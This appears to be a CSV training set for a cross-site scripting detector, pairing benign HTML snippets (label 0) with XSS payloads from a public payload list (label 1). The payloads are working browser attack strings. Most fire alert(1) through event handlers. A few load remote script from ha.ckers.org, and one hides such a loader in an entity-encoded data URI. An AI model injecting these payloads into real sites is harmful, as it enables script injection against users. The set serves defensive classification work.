text,label,source,length,timestamp
"<font oncopy=""alert(1)"" contenteditable>test</font>",1,payloadbox,51,2026-03-01T13:13:37.388686
<img src='image.jpg' alt='image'>,0,generated,33,2026-03-01T13:13:37.401989
<h2>Login</h2>,0,generated,14,2026-03-01T13:13:37.403007
<form action='/submit'><input type='text'></form>,0,generated,49,2026-03-01T13:13:37.413993
"<area onbeforecopy=""alert(1)"" contenteditable>test</area>",1,payloadbox,57,2026-03-01T13:13:37.385678
<form action='/submit'><input type='text'></form>,0,generated,49,2026-03-01T13:13:37.410992
"<style>@keyframes x{}</style><xmp style=""animation-name:x"" onanimationend=""alert(1)""></xmp>",1,payloadbox,91,2026-03-01T13:13:37.393697
<tt id=x tabindex=1 onbeforeactivate=alert(1)></tt>,1,payloadbox,51,2026-03-01T13:13:37.394683
<p>About</p>,0,generated,12,2026-03-01T13:13:37.399984
<a href='/page'>Contact</a>,0,generated,27,2026-03-01T13:13:37.406989
<ul><li>Sign up</li></ul>,0,generated,25,2026-03-01T13:13:37.415994
<map id=x tabindex=1 onbeforedeactivate=alert(1)></map><input autofocus>,1,payloadbox,72,2026-03-01T13:13:37.389686
"<div draggable=""true"" contenteditable>drag me</div><summary ondragover=alert(1) contenteditable>drop here</summary>",1,payloadbox,115,2026-03-01T13:13:37.387778
<form action='/submit'><input type='text'></form>,0,generated,49,2026-03-01T13:13:37.414992
"<style>@keyframes x{}</style><rp style=""animation-name:x"" onanimationend=""alert(1)""></rp>",1,payloadbox,89,2026-03-01T13:13:37.393697
<ul><li>Sign up</li></ul>,0,generated,25,2026-03-01T13:13:37.413993
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><label id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></label>",1,payloadbox,180,2026-03-01T13:13:37.393697
"<html onmouseup=""alert(1)"">test</html>",1,payloadbox,38,2026-03-01T13:13:37.389686
"<optgroup onmousemove=""alert(1)"">test</optgroup>",1,payloadbox,48,2026-03-01T13:13:37.390697
"<small onpaste=""alert(1)"" contenteditable>test</small>",1,payloadbox,54,2026-03-01T13:13:37.391686
"<style>@keyframes slidein {}</style><tfoot style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></tfoot>",1,payloadbox,164,2026-03-01T13:13:37.393697
<command id=x tabindex=1 onbeforeactivate=alert(1)></command>,1,payloadbox,61,2026-03-01T13:13:37.386686
<input type='text' name='field'>,0,generated,32,2026-03-01T13:13:37.407992
<span class='class-3004'>Services</span>,0,generated,40,2026-03-01T13:13:37.405009
<p>About</p>,0,generated,12,2026-03-01T13:13:37.397682
"<image onkeydown=""alert(1)"" contenteditable>test</image>",1,payloadbox,56,2026-03-01T13:13:37.389686
<ul><li>Sign up</li></ul>,0,generated,25,2026-03-01T13:13:37.408990
<meter id=x tabindex=1 onbeforedeactivate=alert(1)></meter><input autofocus>,1,payloadbox,76,2026-03-01T13:13:37.390697
"<style>@keyframes x{}</style><object style=""animation-name:x"" onanimationend=""alert(1)""></object>",1,payloadbox,97,2026-03-01T13:13:37.393697
"<audio draggable=""true"" ondrag=""alert(1)"">test</audio>",1,payloadbox,54,2026-03-01T13:13:37.385678
"<style>@keyframes slidein {}</style><header style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></header>",1,payloadbox,166,2026-03-01T13:13:37.393697
<x onmouseout=alert(1)>hover this!,1,payloadbox,34,2026-03-01T13:13:37.385678
"<style>@keyframes x{}</style><rt style=""animation-name:x"" onanimationstart=""alert(1)""></rt>",1,payloadbox,91,2026-03-01T13:13:37.393697
"<bdo draggable=""true"" ondragstart=""alert(1)"">test</bdo>",1,payloadbox,55,2026-03-01T13:13:37.386686
<noembed onfocusout=alert(1) tabindex=1 id=x></noembed><input autofocus>,1,payloadbox,72,2026-03-01T13:13:37.390697
<span class='class-5194'>Services</span>,0,generated,40,2026-03-01T13:13:37.411988
<menuitem id=x tabindex=1 onfocus=alert(1)></menuitem>,1,payloadbox,54,2026-03-01T13:13:37.390697
"<small onmouseleave=""alert(1)"">test</small>",1,payloadbox,43,2026-03-01T13:13:37.391686
<span class='class-1834'>Services</span>,0,generated,40,2026-03-01T13:13:37.401989
"<blockquote onbeforepaste=""alert(1)"" contenteditable>test</blockquote>",1,payloadbox,70,2026-03-01T13:13:37.386686
<form action='/submit'><input type='text'></form>,0,generated,49,2026-03-01T13:13:37.403007
<form action='/submit'><input type='text'></form>,0,generated,49,2026-03-01T13:13:37.396686
<ul><li>Sign up</li></ul>,0,generated,25,2026-03-01T13:13:37.413993
"<command onkeypress=""alert(1)"" contenteditable>test</command>",1,payloadbox,61,2026-03-01T13:13:37.387778
"<style>:target {color: red;}</style><section id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></section>",1,payloadbox,117,2026-03-01T13:13:37.392697
"<i oncut=""alert(1)"" contenteditable>test</i>",1,payloadbox,44,2026-03-01T13:13:37.389686
<button>Read more</button>,0,generated,26,2026-03-01T13:13:37.408990
<form action='/submit'><input type='text'></form>,0,generated,49,2026-03-01T13:13:37.413993
"<nobr onbeforepaste=""alert(1)"" contenteditable>test</nobr>",1,payloadbox,58,2026-03-01T13:13:37.390697
"<div draggable=""true"" contenteditable>drag me</div><details ondragover=alert(1) contenteditable>drop here</details>",1,payloadbox,115,2026-03-01T13:13:37.387778
<span class='class-1494'>Services</span>,0,generated,40,2026-03-01T13:13:37.400996
"<source onmouseenter=""alert(1)"">test</source>",1,payloadbox,45,2026-03-01T13:13:37.391686
<img src='image.jpg' alt='image'>,0,generated,33,2026-03-01T13:13:37.399984
<caption id=x tabindex=1 ondeactivate=alert(1)></caption><input id=y autofocus>,1,payloadbox,79,2026-03-01T13:13:37.386686
<marquee id=x tabindex=1 onfocus=alert(1)></marquee>,1,payloadbox,52,2026-03-01T13:13:37.390697
<dl id=x tabindex=1 onfocusin=alert(1)></dl>,1,payloadbox,44,2026-03-01T13:13:37.388686
<span class='class-5334'>Services</span>,0,generated,40,2026-03-01T13:13:37.412991
"<div id=""113""><div id=""x"">XXX</div>",1,payloadbox,35,2026-03-01T13:13:37.396686
<div>Home</div>,0,generated,15,2026-03-01T13:13:37.397682
<span class='class-364'>Services</span>,0,generated,39,2026-03-01T13:13:37.397682
<h6>Login</h6>,0,generated,14,2026-03-01T13:13:37.399984
"<hgroup onmousedown=""alert(1)"">test</hgroup>",1,payloadbox,44,2026-03-01T13:13:37.388686
<button>Read more</button>,0,generated,26,2026-03-01T13:13:37.414992
<span class='class-5754'>Services</span>,0,generated,40,2026-03-01T13:13:37.413993
"<xmp onmousedown=""alert(1)"">test</xmp>",1,payloadbox,38,2026-03-01T13:13:37.395688
<input type='text' name='field'>,0,generated,32,2026-03-01T13:13:37.406989
<wbr id=x tabindex=1 onactivate=alert(1)></wbr>,1,payloadbox,47,2026-03-01T13:13:37.395688
<form action='/submit'><input type='text'></form>,0,generated,49,2026-03-01T13:13:37.405009
<a href='/page'>Contact</a>,0,generated,27,2026-03-01T13:13:37.397682
"<acronym onmouseup=""alert(1)"">test</acronym>",1,payloadbox,44,2026-03-01T13:13:37.385678
<slot id=x tabindex=1 onbeforedeactivate=alert(1)></slot><input autofocus>,1,payloadbox,74,2026-03-01T13:13:37.391686
<output id=x tabindex=1 onfocusin=alert(1)></output>,1,payloadbox,52,2026-03-01T13:13:37.390697
<button>Read more</button>,0,generated,26,2026-03-01T13:13:37.414992
"<div draggable=""true"" contenteditable>drag me</div><samp ondrop=alert(1) contenteditable>drop here</samp>",1,payloadbox,105,2026-03-01T13:13:37.387778
<input type='text' name='field'>,0,generated,32,2026-03-01T13:13:37.400996
"<content draggable=""true"" ondrag=""alert(1)"">test</content>",1,payloadbox,58,2026-03-01T13:13:37.387778
"<aside onmouseleave=""alert(1)"">test</aside>",1,payloadbox,43,2026-03-01T13:13:37.385678
<ul><li>Sign up</li></ul>,0,generated,25,2026-03-01T13:13:37.405009
<figcaption id=x tabindex=1 onbeforedeactivate=alert(1)></figcaption><input autofocus>,1,payloadbox,86,2026-03-01T13:13:37.388686
"<p oncontextmenu=""alert(1)"">test</p>",1,payloadbox,36,2026-03-01T13:13:37.390697
"<object ondblclick=""alert(1)"">test</object>",1,payloadbox,43,2026-03-01T13:13:37.390697
<ul><li>Sign up</li></ul>,0,generated,25,2026-03-01T13:13:37.412991
"<datalist ondblclick=""alert(1)"">test</datalist>",1,payloadbox,47,2026-03-01T13:13:37.387778
<button>Read more</button>,0,generated,26,2026-03-01T13:13:37.415994
"<figcaption oncopy=""alert(1)"" contenteditable>test</figcaption>",1,payloadbox,63,2026-03-01T13:13:37.388686
<ul id=x tabindex=1 onfocusin=alert(1)></ul>,1,payloadbox,44,2026-03-01T13:13:37.395688
<button>Read more</button>,0,generated,26,2026-03-01T13:13:37.413993
<meta id=x tabindex=1 onfocusin=alert(1)></meta>,1,payloadbox,48,2026-03-01T13:13:37.390697
"<header onmouseenter=""alert(1)"">test</header>",1,payloadbox,45,2026-03-01T13:13:37.388686
<img src='image.jpg' alt='image'>,0,generated,33,2026-03-01T13:13:37.400996
"<listing onbeforecut=""alert(1)"" contenteditable>test</listing>",1,payloadbox,62,2026-03-01T13:13:37.389686
<input type='text' name='field'>,0,generated,32,2026-03-01T13:13:37.397682
<button>Read more</button>,0,generated,26,2026-03-01T13:13:37.401989
"<sup onkeypress=""alert(1)"" contenteditable>test</sup>",1,payloadbox,53,2026-03-01T13:13:37.394683
<ul><li>Sign up</li></ul>,0,generated,25,2026-03-01T13:13:37.403996
<ul><li>Sign up</li></ul>,0,generated,25,2026-03-01T13:13:37.400996
<mark onblur=alert(1) tabindex=1 id=x></mark><input autofocus>,1,payloadbox,62,2026-03-01T13:13:37.390697
"<pre onbeforecopy=""alert(1)"" contenteditable>test</pre>",1,payloadbox,55,2026-03-01T13:13:37.391686
"<sub onkeydown=""alert(1)"" contenteditable>test</sub>",1,payloadbox,52,2026-03-01T13:13:37.393697
"<summary onbeforepaste=""alert(1)"" contenteditable>test</summary>",1,payloadbox,64,2026-03-01T13:13:37.393697
<ul><li>Sign up</li></ul>,0,generated,25,2026-03-01T13:13:37.401989
<input type='text' name='field'>,0,generated,32,2026-03-01T13:13:37.411988
<ol id=x tabindex=1 onbeforeactivate=alert(1)></ol>,1,payloadbox,51,2026-03-01T13:13:37.390697
<div>Home</div>,0,generated,15,2026-03-01T13:13:37.405991
<video id=x tabindex=1 ondeactivate=alert(1)></video><input id=y autofocus>,1,payloadbox,75,2026-03-01T13:13:37.395688
"<XML SRC=""http://ha.ckers.org/xsstest.xml"" ID=I></XML>",1,payloadbox,54,2026-03-01T13:13:37.396686
<select id=x tabindex=1 ondeactivate=alert(1)></select><input id=y autofocus>,1,payloadbox,77,2026-03-01T13:13:37.391686
"<div onkeyup=""alert(1)"" contenteditable>test</div>",1,payloadbox,50,2026-03-01T13:13:37.388686
<svg><wbr onload=alert(1)></wbr>,1,payloadbox,32,2026-03-01T13:13:37.394683
<p>About</p>,0,generated,12,2026-03-01T13:13:37.396686
"<rect  fill=""white"" style=""clip-path:url(test3.svg#a);fill:url(#b);filter:url(#c);marker:url(#d);mask:url(#e);stroke:url(#f);""/>",1,payloadbox,128,2026-03-01T13:13:37.396686
<input autofocus onblur=alert(1)>,1,payloadbox,33,2026-03-01T13:13:37.385678
<ul><li>Sign up</li></ul>,0,generated,25,2026-03-01T13:13:37.411988
"<figure onmouseleave=""alert(1)"">test</figure>",1,payloadbox,45,2026-03-01T13:13:37.388686
<ul><li>Sign up</li></ul>,0,generated,25,2026-03-01T13:13:37.410992
<ul><li>Sign up</li></ul>,0,generated,25,2026-03-01T13:13:37.397682
"<strike onkeyup=""alert(1)"" contenteditable>test</strike>",1,payloadbox,56,2026-03-01T13:13:37.392697
<a href='/page'>Contact</a>,0,generated,27,2026-03-01T13:13:37.408990
<plaintext onblur=alert(1) tabindex=1 id=x></plaintext><input autofocus>,1,payloadbox,72,2026-03-01T13:13:37.391686
"<a  href=""data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203"">Click  Me</a>",1,payloadbox,304,2026-03-01T13:13:37.396686
<span class='class-2494'>Services</span>,0,generated,40,2026-03-01T13:13:37.403996
"<spacer ondblclick=""alert(1)"">test</spacer>",1,payloadbox,43,2026-03-01T13:13:37.392697
"<center draggable=""true"" ondragend=""alert(1)"">test</center>",1,payloadbox,59,2026-03-01T13:13:37.386686
<table onfocusout=alert(1) tabindex=1 id=x></table><input autofocus>,1,payloadbox,68,2026-03-01T13:13:37.394683
<ul><li>Sign up</li></ul>,0,generated,25,2026-03-01T13:13:37.413993
"<nav onmouseleave=""alert(1)"">test</nav>",1,payloadbox,39,2026-03-01T13:13:37.390697
<h6>Login</h6>,0,generated,14,2026-03-01T13:13:37.409991
<img src='image.jpg' alt='image'>,0,generated,33,2026-03-01T13:13:37.405991
"<tfoot ondblclick=""alert(1)"">test</tfoot>",1,payloadbox,41,2026-03-01T13:13:37.394683
<form action='/submit'><input type='text'></form>,0,generated,49,2026-03-01T13:13:37.400996
<h2>Login</h2>,0,generated,14,2026-03-01T13:13:37.409991
<input type='text' name='field'>,0,generated,32,2026-03-01T13:13:37.415994
"<picture onkeydown=""alert(1)"" contenteditable>test</picture>",1,payloadbox,60,2026-03-01T13:13:37.391686
"<fieldset onmouseover=""alert(1)"">test</fieldset>",1,payloadbox,48,2026-03-01T13:13:37.388686
"<style>@keyframes x{}</style><main style=""animation-name:x"" onanimationstart=""alert(1)""></main>",1,payloadbox,95,2026-03-01T13:13:37.393697
<thead id=x tabindex=1 ondeactivate=alert(1)></thead><input id=y autofocus>,1,payloadbox,75,2026-03-01T13:13:37.394683
<div>Home</div>,0,generated,15,2026-03-01T13:13:37.400996
"<applet onkeypress=""alert(1)"" contenteditable>test</applet>",1,payloadbox,59,2026-03-01T13:13:37.385678
"<colgroup onbeforepaste=""alert(1)"" contenteditable>test</colgroup>",1,payloadbox,66,2026-03-01T13:13:37.386686
<span class='class-1194'>Services</span>,0,generated,40,2026-03-01T13:13:37.399984
<div>Home</div>,0,generated,15,2026-03-01T13:13:37.398687
<button>Read more</button>,0,generated,26,2026-03-01T13:13:37.406989
"<element onkeydown=""alert(1)"" contenteditable>test</element>",1,payloadbox,60,2026-03-01T13:13:37.388686
<h2>Login</h2>,0,generated,14,2026-03-01T13:13:37.406989
"<applet onbeforepaste=""alert(1)"" contenteditable>test</applet>",1,payloadbox,62,2026-03-01T13:13:37.385678
<input type='text' name='field'>,0,generated,32,2026-03-01T13:13:37.408990
<form action='/submit'><input type='text'></form>,0,generated,49,2026-03-01T13:13:37.407992
"<dt onmouseleave=""alert(1)"">test</dt>",1,payloadbox,37,2026-03-01T13:13:37.388686
<h6>Login</h6>,0,generated,14,2026-03-01T13:13:37.415994
"<details onmousemove=""alert(1)"">test</details>",1,payloadbox,46,2026-03-01T13:13:37.387778
<a href='/page'>Contact</a>,0,generated,27,2026-03-01T13:13:37.413993
<h6>Login</h6>,0,generated,14,2026-03-01T13:13:37.401989
<form action='/submit'><input type='text'></form>,0,generated,49,2026-03-01T13:13:37.409991
<input type='text' name='field'>,0,generated,32,2026-03-01T13:13:37.410992
<h2>Login</h2>,0,generated,14,2026-03-01T13:13:37.398687
<div>Home</div>,0,generated,15,2026-03-01T13:13:37.403007
"<strong onpaste=""alert(1)"" contenteditable>test</strong>",1,payloadbox,56,2026-03-01T13:13:37.392697
<meter id=x tabindex=1 onactivate=alert(1)></meter>,1,payloadbox,51,2026-03-01T13:13:37.390697
<rtc id=x tabindex=1 onbeforedeactivate=alert(1)></rtc><input autofocus>,1,payloadbox,72,2026-03-01T13:13:37.391686
<img src='image.jpg' alt='image'>,0,generated,33,2026-03-01T13:13:37.405009
<bdi id=x tabindex=1 onfocus=alert(1)></bdi>,1,payloadbox,44,2026-03-01T13:13:37.386686
<ul><li>Sign up</li></ul>,0,generated,25,2026-03-01T13:13:37.396686
"<var draggable=""true"" ondragstart=""alert(1)"">test</var>",1,payloadbox,55,2026-03-01T13:13:37.395688
<img src='image.jpg' alt='image'>,0,generated,33,2026-03-01T13:13:37.414992
"<xmp oncut=""alert(1)"" contenteditable>test</xmp>",1,payloadbox,48,2026-03-01T13:13:37.395688
"<section onbeforecut=""alert(1)"" contenteditable>test</section>",1,payloadbox,62,2026-03-01T13:13:37.391686
<p>About</p>,0,generated,12,2026-03-01T13:13:37.405991
<button>Read more</button>,0,generated,26,2026-03-01T13:13:37.413993
"<SCRIPT a=`>` SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",1,payloadbox,56,2026-03-01T13:13:37.396686
<script x> alert(1) </script 1=2,1,payloadbox,32,2026-03-01T13:13:37.396686
"<summary onmousedown=""alert(1)"">test</summary>",1,payloadbox,46,2026-03-01T13:13:37.393697
<label id=x tabindex=1 onfocusin=alert(1)></label>,1,payloadbox,50,2026-03-01T13:13:37.389686
<kbd onblur=alert(1) tabindex=1 id=x></kbd><input autofocus>,1,payloadbox,60,2026-03-01T13:13:37.389686
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><td id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></td>",1,payloadbox,174,2026-03-01T13:13:37.393697
<span class='class-2674'>Services</span>,0,generated,40,2026-03-01T13:13:37.403996
<form action='/submit'><input type='text'></form>,0,generated,49,2026-03-01T13:13:37.412991
<ul><li>Sign up</li></ul>,0,generated,25,2026-03-01T13:13:37.410992
"<thead onmouseup=""alert(1)"">test</thead>",1,payloadbox,40,2026-03-01T13:13:37.394683
"<nobr draggable=""true"" ondragstart=""alert(1)"">test</nobr>",1,payloadbox,57,2026-03-01T13:13:37.390697
<a href='/page'>Contact</a>,0,generated,27,2026-03-01T13:13:37.403996
<tbody id=x tabindex=1 onfocus=alert(1)></tbody>,1,payloadbox,48,2026-03-01T13:13:37.394683
<div>Home</div>,0,generated,15,2026-03-01T13:13:37.398687
<div>Home</div>,0,generated,15,2026-03-01T13:13:37.403996
"<track onclick=""alert(1)"">test</track>",1,payloadbox,38,2026-03-01T13:13:37.394683
"<iframe onmousemove=""alert(1)"">test</iframe>",1,payloadbox,44,2026-03-01T13:13:37.389686
<h2>Login</h2>,0,generated,14,2026-03-01T13:13:37.408990
<ul><li>Sign up</li></ul>,0,generated,25,2026-03-01T13:13:37.397682
<button>Read more</button>,0,generated,26,2026-03-01T13:13:37.405991
<h4>Login</h4>,0,generated,14,2026-03-01T13:13:37.400996
"<nav onkeyup=""alert(1)"" contenteditable>test</nav>",1,payloadbox,50,2026-03-01T13:13:37.390697
<sub id=x tabindex=1 onfocus=alert(1)></sub>,1,payloadbox,44,2026-03-01T13:13:37.393697
<img src='image.jpg' alt='image'>,0,generated,33,2026-03-01T13:13:37.397682
<a href='/page'>Contact</a>,0,generated,27,2026-03-01T13:13:37.396686
"<form draggable=""true"" ondragleave=""alert(1)"">test</form>",1,payloadbox,57,2026-03-01T13:13:37.388686
<div>Home</div>,0,generated,15,2026-03-01T13:13:37.415994
<input type='text' name='field'>,0,generated,32,2026-03-01T13:13:37.415994
<svg><pre onload=alert(1)></pre>,1,payloadbox,32,2026-03-01T13:13:37.394683
